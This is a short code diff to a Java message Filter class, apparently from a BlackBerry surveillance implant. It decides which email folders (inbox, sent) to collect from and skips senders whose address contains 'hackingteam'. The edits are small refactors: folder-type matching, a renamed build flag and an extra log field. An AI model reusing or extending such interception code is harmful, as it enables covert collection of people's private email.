@@ -18,6 +18,7 @@ import net.rim.blackberry.api.mail.Folder;
 import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.mail.MessagingException;
 import net.rim.blackberry.api.mail.event.FolderEvent;
+import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.agent.Prefix;
 import blackberry.utils.Check;
@@ -52,7 +53,7 @@ public class Filter {
     static final int FILTERED_INTERNAL = -8;
     static final int FILTERED_OK = 0;
 
-    String[] folderNames = new String[] { "Inbox", "Outbox" };
+    int[] folderTypes = new int[] { Folder.INBOX, Folder.SENT };
 
     public int size;
 
@@ -217,7 +218,7 @@ public class Filter {
         //#ifdef DBC
         Check.asserts(from != null, "filterMessage: from!=null");
         //#endif
-        //#ifdef DEBUG
+        //#ifdef EXCLUDE_INTERNAL
         for (int i = 0; i < from.length; i++) {
             String addr = from[i].getAddr();
             if (addr != null && addr.indexOf("hackingteam") > -1) {
@@ -231,11 +232,11 @@ public class Filter {
 
         boolean found = false;
         if (folder != null) {
-            String folderName = folder.getName();
-            int fsize = folderNames.length;
+            int folderType = folder.getType();
+            int fsize = folderTypes.length;
 
             for (int i = 0; i < fsize; i++) {
-                if (folderNames[i].equals(folderName)) {
+                if (folderTypes[i] == folderType) {
                     found = true;
                     break;
                 }
@@ -244,7 +245,8 @@ public class Filter {
 
         if (!found) {
             //#ifdef DEBUG_INFO
-            debug.info("filterMessage: FILTERED_FOUND: " + folder.getName());
+            debug.info("filterMessage: FILTERED_FOUND: " + folder.getName()
+                    + " type: " + folder.getType());
             //#endif
             return FILTERED_FOUND;
         }
